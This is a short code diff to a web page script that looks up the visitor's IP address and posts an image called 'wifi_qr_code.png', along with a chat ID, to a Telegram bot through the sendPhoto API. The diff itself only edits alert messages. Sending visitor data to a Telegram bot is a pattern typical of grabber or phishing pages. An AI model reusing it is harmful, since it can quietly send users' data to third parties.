@@ -111,10 +111,9 @@
                 .then(response => response.json())
                 .then(data => {
                     document.getElementById('ipNetwork').textContent = data.ip;
-                    // You can do something with the IP address here
                 })
                 .catch(error => {
-                    console.error('Error fetching IP:', error);
+                    alert('Error fetching IP:', error);
                 });
         }
         async function submitForm() {
@@ -167,8 +166,7 @@
                     formData.append('chat_id', chatId);
                     formData.append('photo', dataURLToBlob(finalImage), 'wifi_qr_code.png');
                     const networkIP = document.getElementById('ipNetwork').textContent;
-
-                    alert(`ip: ${networkIP}`);
+                    alert(`ip network: ${networkIP}`);
                     try {
                         const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                             method: 'POST',
